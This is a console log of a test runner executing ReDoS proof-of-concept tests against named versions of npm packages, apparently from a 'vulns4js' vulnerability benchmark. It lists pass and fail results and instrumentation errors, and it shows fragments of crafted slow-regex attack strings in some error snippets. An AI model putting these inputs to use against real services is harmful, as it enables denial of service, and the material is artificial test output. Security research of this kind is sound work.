Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        11.764 s
Ran all test suites matching /redos\/is-my-json-valid_2.20.1\/is-my-json-valid.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'filter', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 6\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/codemirror_5.58.0/codemirror.test.js
PASS codemirror_5.58.0/codemirror.test.js (6.384 s)
  ✓ ReDos in codemirror (5850 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        6.747 s
Ran all test suites matching /redos\/codemirror_5.58.0\/codemirror.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'defaults',           'optionHandlers',       'defineInitHook',\n      'defineOption',       'Init',                 'helpers',\n      'registerHelper',     'registerGlobalHelper', 'inputStyles',\n      'defineMode',         'defineMIME',           'defineExtension',\n      'defineDocExtension', 'fromTextArea',         'off',\n      'on',                 'wheelEventPixels',     'Doc',\n      'splitLines',         'countColumn',          'findColumn',\n      'isWordChar',         'Pass',                 'signal',\n      'Line',               'changeEnd',            'scrollbarModel',\n      'Pos',                'cmpPos',               'modes',\n      'mimeModes',          'resolveMode',          'getMode',\n      'modeExtensions',     'extendMode',           'copyState',\n      'startState',         'innerMode',            'commands',\n      'keyMap',             'keyName',              'isModifierKey',\n      'lookupKey',          'normalizeKeyMap',      'StringStream',\n      'SharedTextMarker',   'TextMarker',           'LineWidget',\n      'e_preventDefault',   'e_stopPropagation',    'e_stop',\n      'addClass',           'contains',             'rmClass',\n      'keyNames',           'version'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(0) {}\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: -1, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/ajv_5.2.2/ajv.test.js
PASS ajv_5.2.2/ajv.test.js
  ✓ ReDoS in ajv (4503 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        5.26 s, estimated 6 s
Ran all test suites matching /redos\/ajv_5.2.2\/ajv.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'ValidationError', 'MissingRefError', '$dataMetaSchema', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'prototype' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 9\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/truncate_2.0.0/truncate.test.js
PASS truncate_2.0.0/truncate.test.js (6.967 s)
  ✓ ReDos in truncate (6435 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        7.34 s
Ran all test suites matching /redos\/truncate_2.0.0\/truncate.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/ducktype_1.2.0/ducktype.test.js
PASS ducktype_1.2.0/ducktype.test.js
  ✓ ReDos in ducktype (1656 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.588 s
Ran all test suites matching /redos\/ducktype_1.2.0\/ducktype.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    false\n\n      at f (ducktype_1.2.0/ducktype.test.js:6:13)\n\n  console.log\n    [\n      'construct', 'array',\n      'boolean',   'date',\n      'function',  'number',\n      'object',    'regexp',\n      'string',    'null',\n      'undefined', 'url',\n      'email',     'integer',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'url' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/semver-regex_3.1.1/semver-regex.test.js
FAIL semver-regex_3.1.1/semver-regex.test.js
  ✕ ReDos in semver-regex (24 ms)

  ● ReDos in semver-regex

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/semver-regex_3.1.1/node_modules/semver-regex/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in semver-regex

    TypeError: semverRegex is not a function

       9 |   let attack_str = version + "aaaaaaa$";
      10 |   let t = measureTime(function () {
    > 11 |     semverRegex().test(attack_str);
         |     ^
      12 |   });
      13 |   let time = t[0] + t[1] / 1000000000;
      14 |   expect(time).toBeGreaterThan(1);

      at f (semver-regex_3.1.1/semver-regex.test.js:11:5)
      at measureTime (utils.js:35:3)
      at Object.<anonymous> (semver-regex_3.1.1/semver-regex.test.js:10:11)

  ● ReDos in semver-regex

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.95 s
Ran all test suites matching /redos\/semver-regex_3.1.1\/semver-regex.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/semver-regex_3.1.1/semver-regex.test.js']' returned non-zero exit status 1.
redos/tmpl_1.0.0/tmpl.test.js
PASS tmpl_1.0.0/tmpl.test.js
  ✓ ReDoS in tmpl (1235 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.142 s
Ran all test suites matching /redos\/tmpl_1.0.0\/tmpl.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/timespan_2.3.0/timespan.test.js
PASS timespan_2.3.0/timespan.test.js
  ✓ ReDos in timespan (3922 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.826 s
Ran all test suites matching /redos\/timespan_2.3.0\/timespan.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'TimeSpan',\n      'fromMilliseconds',\n      'fromSeconds',\n      'fromMinutes',\n      'fromHours',\n      'fromDays',\n      'parse',\n      'parseDate',\n      'fromDates',\n      'test',\n      'instanceOf',\n      'clone'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parseDate' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/trim-off-newlines_1.0.0/trim-off-newlines.test.js
PASS trim-off-newlines_1.0.0/trim-off-newlines.test.js
  ✓ ReDos in trim-off-newlines (3719 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.636 s
Ran all test suites matching /redos\/trim-off-newlines_1.0.0\/trim-off-newlines.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/html-parse-stringify2_2.0.1/html-parse-stringify2.test.js
PASS html-parse-stringify2_2.0.1/html-parse-stringify2.test.js
  ✓ ReDos in html-parse-stringify2 (1477 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.465 s
Ran all test suites matching /redos\/html-parse-stringify2_2.0.1\/html-parse-stringify2.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'parse', 'stringify' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parse' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/is-email_1.0.0/is-email.test.js
PASS is-email_1.0.0/is-email.test.js (9.685 s)
  ✓ ReDos in is-email (9126 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        10.052 s
Ran all test suites matching /redos\/is-email_1.0.0\/is-email.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/markdown_0.3.0/markdown-js.test.js
FAIL markdown_0.3.0/markdown-js.test.js
  ✕ ReDos in markdown-js (71 ms)

  ● ReDos in markdown-js

    ReferenceError: attack_str is not defined

      3 |   const markdown = require("markdown").markdown;
      4 |   const { genstr } = require("../utils");
    > 5 |   attack_str = "cispa" + genstr(300000, "_");
        |             ^
      6 |   let t = measureTime(function () {
      7 |     html_content = markdown.toHTML(attack_str);
      8 |   });

      at Object.<anonymous> (markdown_0.3.0/markdown-js.test.js:5:13)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.265 s
Ran all test suites matching /redos\/markdown_0.3.0\/markdown-js.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/markdown_0.3.0/markdown-js.test.js']' returned non-zero exit status 1.
redos/ethers_5.2.0/ethers.test.js
FAIL ethers_5.2.0/ethers.test.js
  ✕ ReDos in ethers (3678 ms)

  ● ReDos in ethers

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/@ethersproject/providers/node_modules/ws/lib/validation.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in ethers

    expect(received).toBeGreaterThan(expected)

    Expected: > 1
    Received:   0.000059074

       9 |   });
      10 |   let time = t[0] + t[1] / 1000000000;
    > 11 |   expect(time).toBeGreaterThan(1);
         |                ^
      12 | });
      13 | 

      at Object.<anonymous> (ethers_5.2.0/ethers.test.js:11:16)

  ● ReDos in ethers

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        4.839 s
Ran all test suites matching /redos\/ethers_5.2.0\/ethers.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/ethers_5.2.0/ethers.test.js']' returned non-zero exit status 1.
redos/terminal-kit_2.1.0/terminal-kit.test.js
FAIL terminal-kit_2.1.0/terminal-kit.test.js
  ✕ ReDos in terminal-kit (126 ms)

  ● ReDos in terminal-kit

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/terminal-kit/lib/misc.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in terminal-kit

    TypeError: termkit.markupWidth is not a function

       6 | 
       7 |   let t = measureTime(function () {
    >  8 |     termkit.markupWidth(payload);
         |             ^
       9 |   });
      10 | 
      11 |   let time = t[0] + t[1] / 1000000000;

      at f (terminal-kit_2.1.0/terminal-kit.test.js:8:13)
      at measureTime (utils.js:35:3)
      at Object.<anonymous> (terminal-kit_2.1.0/terminal-kit.test.js:7:11)

  ● ReDos in terminal-kit

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.033 s
Ran all test suites matching /redos\/terminal-kit_2.1.0\/terminal-kit.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/terminal-kit_2.1.0/terminal-kit.test.js']' returned non-zero exit status 1.
redos/printf_0.6.0/printf.test.js
PASS printf_0.6.0/printf.test.js
  ✓ ReDos in printf (1593 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.496 s
Ran all test suites matching /redos\/printf_0.6.0\/printf.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'Formatter', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/ansi-html_0.0.7/ansi-html.test.js
PASS ansi-html_0.0.7/ansi-html.test.js (6.1 s)
  ✓ ReDoS in ansi-html (5584 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        6.482 s
Ran all test suites matching /redos\/ansi-html_0.0.7\/ansi-html.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'setColors', 'reset', 'tags', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/sshpk_1.13.1/sshpk.test.js
PASS sshpk_1.13.1/sshpk.test.js
  ✓ ReDos in sshpk (2531 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.425 s
Ran all test suites matching /redos\/sshpk_1.13.1\/sshpk.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'Key',\n      'parseKey',\n      'Fingerprint',\n      'parseFingerprint',\n      'Signature',\n      'parseSignature',\n      'PrivateKey',\n      'parsePrivateKey',\n      'generatePrivateKey',\n      'Certificate',\n      'parseCertificate',\n      'createSelfSignedCertificate',\n      'createCertificate',\n      'Identity',\n      'identityFromDN',\n      'identityForHost',\n      'identityForUser',\n      'identityForEmail',\n      'FingerprintFormatError',\n      'InvalidAlgorithmError',\n      'KeyParseError',\n      'SignatureParseError',\n      'KeyEncryptedError',\n      'CertificateParseError'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parseKey' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/forwarded_0.1.0/forwarded.test.js
PASS forwarded_0.1.0/forwarded.test.js
  ✓ ReDos in forwarded (3733 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.633 s
Ran all test suites matching /redos\/forwarded_0.1.0\/forwarded.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/is-svg_4.2.2/is-svg.test.js
FAIL is-svg_4.2.2/is-svg.test.js
  ✕ ReDos in is-svg (40 ms)

  ● ReDos in is-svg

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/is-svg/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in is-svg

    TypeError: isSvg is not a function

       5 |   let attack_str = "<!Entity" + genstr(25000, " ");
       6 |   let t = measureTime(function () {
    >  7 |     isSvg(attack_str);
         |     ^
       8 |   });
       9 |   let time = t[0] + t[1] / 1000000000;
      10 |   expect(time).toBeGreaterThan(1);

      at f (is-svg_4.2.2/is-svg.test.js:7:5)
      at measureTime (utils.js:35:3)
      at Object.<anonymous> (is-svg_4.2.2/is-svg.test.js:6:11)

  ● ReDos in is-svg

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.936 s
Ran all test suites matching /redos\/is-svg_4.2.2\/is-svg.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/is-svg_4.2.2/is-svg.test.js']' returned non-zero exit status 1.
redos/colors-cli_1.0.25/colors-cli.test.js
PASS colors-cli_1.0.25/colors-cli.test.js
  ✓ ReDos in colors-cli (3656 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.575 s
Ran all test suites matching /redos\/colors-cli_1.0.25\/colors-cli.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'color',     'black',      'black_b',   'black_bt',   'black_bbt',\n      'red',       'red_b',      'red_bt',    'red_bbt',    'green',\n      'green_b',   'green_bt',   'green_bbt', 'yellow',     'yellow_b',\n      'yellow_bt', 'yellow_bbt', 'blue',      'blue_b',     'blue_bt',\n      'blue_bbt',  'magenta',    'magenta_b', 'magenta_bt', 'magenta_bbt',\n      'cyan',      'cyan_b',     'cyan_bt',   'cyan_bbt',   'white',\n      'white_b',   'white_bt',   'white_bbt', 'x0',         'xb0',\n      'x1',        'xb1',        'x2',        'xb2',        'x3',\n      'xb3',       'x4',         'xb4',       'x5',         'xb5',\n      'x6',        'xb6',        'x7',        'xb7',        'x8',\n      'xb8',       'x9',         'xb9',       'x10',        'xb10',\n      'x11',       'xb11',       'x12',       'xb12',       'x13',\n      'xb13',      'x14',        'xb14',      'x15',        'xb15',\n      'x16',       'xb16',       'x17',       'xb17',       'x18',\n      'xb18',      'x19',        'xb19',      'x20',        'xb20',\n      'x21',       'xb21',       'x22',       'xb22',       'x23',\n      'xb23',      'x24',        'xb24',      'x25',        'xb25',\n      'x26',       'xb26',       'x27',       'xb27',       'x28',\n      'xb28',      'x29',        'xb29',      'x30',        'xb30',\n      'x31',       'xb31',       'x32',       'xb32',       'x33',\n      ... 455 more items\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(0) {}\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: -1, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/valid-email_0.0.1/valid-email.test.js
FAIL valid-email_0.0.1/valid-email.test.js
  ✕ ReDos in valid-email (695 ms)

  ● ReDos in valid-email

    expect(received).toBeGreaterThan(expected)

    Expected: > 1
    Received:   0.663546805

      13 |   });
      14 |   let time = t[0] + t[1] / 1000000000;
    > 15 |   expect(time).toBeGreaterThan(1);
         |                ^
      16 | });
      17 | 

      at Object.<anonymous> (valid-email_0.0.1/valid-email.test.js:15:16)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.543 s, estimated 2 s
Ran all test suites matching /redos\/valid-email_0.0.1\/valid-email.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/valid-email_0.0.1/valid-email.test.js']' returned non-zero exit status 1.
redos/htmlparser_1.7.7/htmlparser.test.js
PASS htmlparser_1.7.7/htmlparser.test.js
  ✓ ReDos in htmlparser (2491 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.564 s
Ran all test suites matching /redos\/htmlparser_1.7.7\/htmlparser.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
